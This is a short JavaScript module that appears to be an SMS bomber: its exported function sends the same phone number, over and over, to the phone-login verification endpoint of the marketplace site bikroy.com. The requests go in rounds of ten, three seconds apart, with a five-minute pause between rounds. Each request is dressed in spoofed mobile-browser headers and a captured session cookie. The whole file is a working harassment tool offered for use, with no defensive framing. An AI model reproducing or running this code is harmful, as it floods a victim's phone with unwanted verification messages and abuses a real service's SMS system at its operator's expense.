const axios = require("axios");

async function bikroy(number, limit) {
  for (let round = 0; round < limit; round++) {
    console.log(`▶ Round ${round + 1}/${limit} started`);

    for (let i = 0; i < 10; i++) {
      try {
      const response = await axios.get('https://bikroy.com/data/phone_number_login/verifications/phone_login', {
  params: {
    'phone': number
  },
  headers: {
    'authority': 'bikroy.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'bn',
    'application-name': 'web',
    'cookie': 'locale=bn; _gcl_au=1.1.1841454724.1750736772; _fbp=fb.1.1750736772499.215938946586591581; _ga=GA1.1.2002501629.1750736773; ab-test.pwa-only=reactapp; _sp_ses.c10b=*; _sp_id.c10b=30f815da7bd960b3.1750736772.2.1750795153.1750736818.34041235-6eac-4848-9830-743d8a183551; _ga_LV7HJQBLZX=GS2.1.s1750795125$o2$g1$t1750795153$j32$l0$h0',
    'referer': 'https://bikroy.com/?login-modal=true&redirect-url=/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
  }
});
        console.log(`[${i + 1}/10] Sent to ${number} | Response:`, response.data);
      } catch (error) {
        console.error(`[${i + 1}/10] Failed:`, error.message);
      }

      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    if (round < limit - 1) {
      console.log(`⏳ Waiting 5 minutes before next round...`);
      await new Promise(resolve => setTimeout(resolve, 300000));
    }
  }

  console.log("✅ All rounds completed.");
    }

module.exports = { bikroy };
